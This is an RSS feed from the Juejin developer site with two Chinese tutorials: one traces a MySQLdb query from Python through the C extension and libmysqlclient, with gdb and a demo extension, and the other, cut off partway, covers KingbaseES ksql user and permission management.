<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[一条 Python 语句在 C 扩展里到底怎么跑]]></title>    <link>https://juejin.cn/post/7592863358258266166</link>    <guid>https://juejin.cn/post/7592863358258266166</guid>    <pubDate>2026-01-08T14:29:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592863358258266166" data-draft-id="7592863358258249782" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一条 Python 语句在 C 扩展里到底怎么跑"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-08T14:29:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哈里谢顿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一条 Python 语句在 C 扩展里到底怎么跑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哈里谢顿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T14:29:14.000Z" title="Thu Jan 08 2026 14:29:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>要真正搞清“一条 Python 语句在 C 扩展里到底怎么跑”，最好把源码、调用栈、GIL 释放点、网络收发点都“跟”一遍。下面以<br/>
<code>MySQLdb.connection.query("SELECT …")</code><br/>
为例，把从 Python 层到 C 层再到 libmysqlclient 的完整路径拆给你看。<br/>
（代码行号基于 mysqlclient-python 2.2.x，MySQL-Connector/C 8.0.x，CPython 3.11）</p>
<hr/>
<h2 data-id="heading-0">一、Python 层：MySQLdb/<strong>init</strong>.py</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> _mysql          <span class="hljs-comment"># 这是 C 扩展模块</span>
…
connect = _mysql.connect
Connection = _mysql.connection
</code></pre>
<p>MySQLdb 只是对 _mysql 做了一层薄薄的包装，真正的类叫 <code>_mysql.connection</code>，所以<br/>
<code>MySQLdb.connection.query</code> 其实就是<br/>
<code>_mysql.connection.query</code>。</p>
<hr/>
<h2 data-id="heading-1">二、C 扩展层：_mysql.c</h2>
<p>模块初始化时把 <code>connection</code> 类型注册到 Python：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">static</span> PyTypeObject MyConnection_Type = {
    PyVarObject_HEAD_INIT(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)
    .tp_name = <span class="hljs-string">"_mysql.connection"</span>,
    .tp_methods = _mysql_ConnectionObject_methods,
    …
};
</code></pre>
<p><code>.tp_methods</code> 里有一项：</p>
<pre><code class="hljs language-c" lang="c">{<span class="hljs-string">"query"</span>, (PyCFunction)_mysql_ConnectionObject_query, METH_VARARGS,
 PyDoc_STR(<span class="hljs-string">"query(sql) -&gt; None"</span>)},
</code></pre>
<p>因此 Python 虚拟机在执行<br/>
<code>LOAD_ATTR</code> + <code>CALL_METHOD</code> 指令时，通过 PyType 的 method resolution 直接找到<br/>
<code>_mysql_ConnectionObject_query</code>。</p>
<hr/>
<h2 data-id="heading-2">三、C 函数内部：_mysql_ConnectionObject_query</h2>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">static</span> PyObject *
_mysql_ConnectionObject_query(MyConnectionObject *self, PyObject *args)
{
    <span class="hljs-type">char</span> *sql;
    <span class="hljs-type">int</span>  len;
    <span class="hljs-keyword">if</span> (!PyArg_ParseTuple(args, <span class="hljs-string">"s#"</span>, &amp;sql, &amp;len))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;

    Py_BEGIN_ALLOW_THREADS          <span class="hljs-comment">/* 1. 主动释放 GIL */</span>
    <span class="hljs-type">int</span> r = mysql_real_query(self-&gt;conn, sql, len);
    Py_END_ALLOW_THREADS            <span class="hljs-comment">/* 2. 重新拿 GIL */</span>

    <span class="hljs-keyword">if</span> (r) {
        _mysql_Exception(self);     <span class="hljs-comment">/* 3. 把 mysql_error() 包装成 Python 异常 */</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    }
    Py_RETURN_NONE;
}
</code></pre>
<p>关键三步：</p>
<ol>
<li>释放 GIL → 其他 Python 线程可以跑；</li>
<li>调 libmysqlclient 的 <code>mysql_real_query()</code>；</li>
<li>出错就把 C 的 <code>mysql_error()</code>/<code>mysql_errno()</code> 转成 <code>_mysql.ProgrammingError</code>/<code>DatabaseError</code> 等 Python 异常。</li>
</ol>
<hr/>
<h2 data-id="heading-3">四、libmysqlclient 层：mysql_real_query()</h2>
<p>libmysqlclient 是 C 语言官方客户端库，内部做了：</p>
<ul>
<li>把 SQL 按 MySQL 协议打成 TCP 包（<code>net_write_command()</code>）</li>
<li>阻塞 <code>recv()</code> 等待 server 返回结果包</li>
<li>如果 SQL 是 SELECT，后续还会再调 <code>mysql_store_result()</code>/<code>mysql_use_result()</code> 读结果集。</li>
</ul>
<hr/>
<h2 data-id="heading-4">五、结果集怎么回到 Python？</h2>
<p>如果你在 Python 里继续写：</p>
<pre><code class="hljs language-python" lang="python">cursor = conn.cursor()
cursor.execute(<span class="hljs-string">"SELECT …"</span>)
</code></pre>
<p><code>cursor.execute</code> 会再调 <code>_mysql.connection.query</code>，然后：</p>
<ol>
<li><code>_mysql_ConnectionObject_store_result()</code> 把 <code>MYSQL_RES *</code> 抓出来；</li>
<li>用 <code>PyList_New()</code>/<code>PyTuple_New()</code> 把每一行转成 Python 对象；</li>
<li>把 <code>MYSQL_FIELD</code> 的类型映射成 Python 类型（<code>FIELD_TYPE_LONG</code>→PyLong，<code>FIELD_TYPE_DATETIME</code>→PyDateTime 等）。<br/>
这一步在 <strong>持有 GIL</strong> 的情况下做，因为要把 C 数据喂给 Python 对象。</li>
</ol>
<hr/>
<h2 data-id="heading-5">六、小结：一条语句的“旅程”</h2>
<p>Python 字节码<br/>
→ LOAD_ATTR “query”<br/>
→ CALL_METHOD (进入 C)<br/>
→ PyArg_ParseTuple<br/>
→ Py_BEGIN_ALLOW_THREADS<br/>
→ libmysqlclient:mysql_real_query (阻塞等网络)<br/>
→ Py_END_ALLOW_THREADS<br/>
→ 出错则 _mysql_Exception<br/>
→ 返回 Py_None。</p>
<hr/>
<h2 data-id="heading-6">七、动手验证：gdb + ltrace 看现场</h2>
<ol>
<li>装 debug 符号<br/>
<code>apt install python3-dbg libmysqlclient-dev mysql-client-core-8.0-dbg</code></li>
<li>起 gdb
<pre><code class="hljs language-sql" lang="sql">gdb <span class="hljs-operator">-</span>ex r <span class="hljs-comment">--args python3 -c "</span>
import MySQLdb, <span class="hljs-type">time</span>
c<span class="hljs-operator">=</span>MySQLdb.connect(<span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">'root'</span>,passwd<span class="hljs-operator">=</span><span class="hljs-string">'***'</span>)
c.query(<span class="hljs-string">'SELECT 1'</span>)
"
</code></pre>
</li>
<li>下断点<br/>
<code>(gdb) b _mysql_ConnectionObject_query</code><br/>
<code>(gdb) b mysql_real_query</code></li>
<li>单步<br/>
<code>(gdb) n</code>  可以看到 <code>Py_BEGIN_ALLOW_THREADS</code> 宏展开后调用<br/>
<code>PyThread_release_lock()</code>；<br/>
继续 <code>s</code> 能跟到 <code>net_write_command()</code> → <code>send()</code>/<code>recv()</code>。</li>
</ol>
<hr/>
<h2 data-id="heading-7">八、写个最小 C 扩展 Demo（把上面流程自己跑一遍）</h2>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// demo.c</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> PY_SSIZE_T_CLEAN</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Python.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mysql.h&gt;</span></span>

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
    PyObject_HEAD
    MYSQL *mysql;
} DemoConn;

<span class="hljs-type">static</span> PyObject *
<span class="hljs-title function_">DemoConn_query</span><span class="hljs-params">(DemoConn *self, PyObject *args)</span>
{
    <span class="hljs-type">char</span> *sql;
    Py_ssize_t len;
    <span class="hljs-keyword">if</span> (!PyArg_ParseTuple(args, <span class="hljs-string">"s#"</span>, &amp;sql, &amp;len))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;

    Py_BEGIN_ALLOW_THREADS
    <span class="hljs-type">int</span> err = mysql_real_query(self-&gt;mysql, sql, len);
    Py_END_ALLOW_THREADS

    <span class="hljs-title function_">if</span> <span class="hljs-params">(err)</span> {
        PyErr_Format(PyExc_RuntimeError, <span class="hljs-string">"mysql: %s"</span>, mysql_error(self-&gt;mysql));
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    }
    Py_RETURN_NONE;
}

<span class="hljs-type">static</span> PyMethodDef DemoConn_methods[] = {
    {<span class="hljs-string">"query"</span>, (PyCFunction)DemoConn_query, METH_VARARGS, <span class="hljs-string">""</span>},
    {<span class="hljs-literal">NULL</span>}
};

<span class="hljs-type">static</span> PyTypeObject DemoConnType = {
    PyVarObject_HEAD_INIT(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)
    .tp_name = <span class="hljs-string">"demo.Connection"</span>,
    .tp_basicsize = <span class="hljs-keyword">sizeof</span>(DemoConn),
    .tp_flags = Py_TPFLAGS_DEFAULT,
    .tp_methods = DemoConn_methods,
};

<span class="hljs-type">static</span> PyModuleDef demomodule = {
    PyModuleDef_HEAD_INIT,
    .m_name = <span class="hljs-string">"demo"</span>,
    .m_size <span class="hljs-number">-1</span>,
};

PyMODINIT_FUNC
<span class="hljs-title function_">PyInit_demo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    PyObject *m = PyModule_Create(&amp;demomodule);
    <span class="hljs-keyword">if</span> (!m) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    <span class="hljs-keyword">if</span> (PyType_Ready(&amp;DemoConnType) &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    PyModule_AddObject(m, <span class="hljs-string">"Connection"</span>, (PyObject*)&amp;DemoConnType);
    <span class="hljs-keyword">return</span> m;
}
</code></pre>
<p>编译</p>
<pre><code class="hljs language-makefile" lang="makefile">python3 -m pip install mysqlclient  <span class="hljs-comment"># 确保有头文件</span>
gcc -shared -fPIC <span class="hljs-variable">$(python3-config --includes)</span> \
    -I/usr/<span class="hljs-keyword">include</span>/mysql -L/usr/lib/x86_64-linux-gnu \
    demo.c -lmysqlclient -o demo<span class="hljs-variable">$(python3-config --extension-<span class="hljs-built_in">suffix</span>)</span>
</code></pre>
<p>测试</p>
<pre><code class="hljs language-ini" lang="ini">python3 -c "
import demo, MySQLdb
<span class="hljs-attr">c</span> = demo.Connection()   <span class="hljs-comment"># 这里省掉了 connect 参数，仅演示</span>
c.query('SELECT 1')
"
</code></pre>
<p>用 <code>ltrace -e mysql_real_query python3 test.py</code> 就能抓到库函数调用。</p>
<hr/>
<h2 data-id="heading-8">九、随手可记的“脑图”</h2>
<pre><code class="hljs language-objectivec" lang="objectivec">Python 语句
   ↓ 字节码 <span class="hljs-built_in">CALL_METHOD</span>
C 扩展函数  (PyCFunction)
   ↓ Py_BEGIN_ALLOW_THREADS
libmysqlclient 阻塞网络
   ↓ Py_END_ALLOW_THREADS
结果 or 异常 → Python 对象
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【金仓数据库】ksql 指南（六）—— 创建与管理用户和权限（KingbaseES 安全控制核心）]]></title>    <link>https://juejin.cn/post/7592819937652441103</link>    <guid>https://juejin.cn/post/7592819937652441103</guid>    <pubDate>2026-01-08T14:29:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592819937652441103" data-draft-id="7592615536385622050" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【金仓数据库】ksql 指南（六）—— 创建与管理用户和权限（KingbaseES 安全控制核心）"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2026-01-08T14:29:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="倔强的石头_"/> <meta itemprop="url" content="https://juejin.cn/user/3168119757484368"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【金仓数据库】ksql 指南（六）—— 创建与管理用户和权限（KingbaseES 安全控制核心）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3168119757484368/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    倔强的石头_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T14:29:30.000Z" title="Thu Jan 08 2026 14:29:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b8c1095fd93644b4a9deaaac6af8d762~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=L5c5KBRAYhSbv929hF%2BeyQYfDgU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">引言</h2>
<p>完成数据库，表，索引这些核心对象的运作之后，“用户与权限控制”就成了保障 KingbaseES 数据安全的重点所在，经由细致的用户运作和权限分配，可以规避未授权访问以及误操作之类的风险，比如普通用户就无权删除核心表。本文针对“ksql 命令行操作用户与权限”展开论述，覆盖从“创建用户 - 查看用户 - 修改用户 - 授权/回收权限 - 删除用户”这样完整的流程，并结合真实的业务场景来分解具体的执行步骤，各个阶段均给出相关的语法，例子以及防止常见错误的提示，从而保证初学者能够掌握到安全控制的主要要点。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f29cd37eb76c486a915fd80dde03142e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=Y7%2F12KWUx7f9NXgiuehd12%2BG0q4%3D" alt="" loading="lazy"/></p>
<p>@[toc]</p>
<h3 data-id="heading-1">一、前置准备：明确 “谁来操作” 与 “操作基础”</h3>
<p>用户与权限运作属于“高危运作”，要保证运作环境具备如下条件（结合前面内容，防止因为权限不够或者环境有误致使运作出现故障）</p>
<h4 data-id="heading-2">1.1 1. 用管理员账号连接数据库</h4>
<p>管理员用户（比如预设的 <code>system</code>）具备创建，更改，删除其他用户的相关权限，普通用户并不具有这些权限，要经由 ksql 以管理员的身份去关联本地数据库</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 连接默认数据库 kingbase，用户为 system</span>
ksql -d kingbase -U system
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f58d273272a40b28b4b036b3ff02ff2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=d7GOs6Stwxm5lHhcYGpNfqEQh04%3D" alt="image.png" loading="lazy"/></p>
<p>连接创建之后，提示符变为 <code>kingbase=#</code>，其中，管理员的提示符是 <code>#</code>，普通用户的是 <code>&gt;</code>，经由提示符能够立即识别出权限等级</p>
<h4 data-id="heading-3">1.2 2. 确认操作依赖的对象（衔接前文）</h4>
<p>后续权限示例将基于前文创建的对象：</p>
<ul>
<li>数据库：<code>kingbase</code>（默认数据库）、<code>test</code>（前文创建的测试库）；</li>
<li>模式：<code>test_schema</code>（前文创建的模式）；</li>
<li>表：<code>test_schema.sys_user</code>（前文创建的用户表）；<br/>
确保这些对象存在（可通过 <code>\l</code> 查数据库、<code>\dn</code> 查模式、<code>\dt test_schema.*</code> 查表），若不存在可参考前文重新创建，避免示例执行失败。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e5da534a87e4b788865b316ea85a54b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=dk6grJ5rUFdmLwBkba082k%2FE6tc%3D" alt="image.png" loading="lazy"/></li>
</ul>
<h3 data-id="heading-4">二、核心概念：用户与权限的 “层级关系”</h3>
<p>新手要先领会 KingbaseES 权限的“层级特性”，即权限按“数据库 → 模式 → 表”由高到低分级，只有得到上层权限才可操作下层对象（若无数据库关联权限，则无法操作库中的表）。
KingbaseES隐含的权限层级如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bedda0b9deaf40319bebe7ad23912474~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=%2F6LjgDAaI%2Bnqtsr9CrgyIpnzhx0%3D" alt="image.png" loading="lazy"/></p>
<p>KingbaseES存在隐含的权限层级，后面的全部权限操作都会环绕这三个层级来执行，以此保证权限分配达到“最小化”效果（也就是仅仅给予用户所需的权限，防止出现过度授权的情况）。</p>
<h3 data-id="heading-5">三、创建用户：基础用户管理第一步</h3>
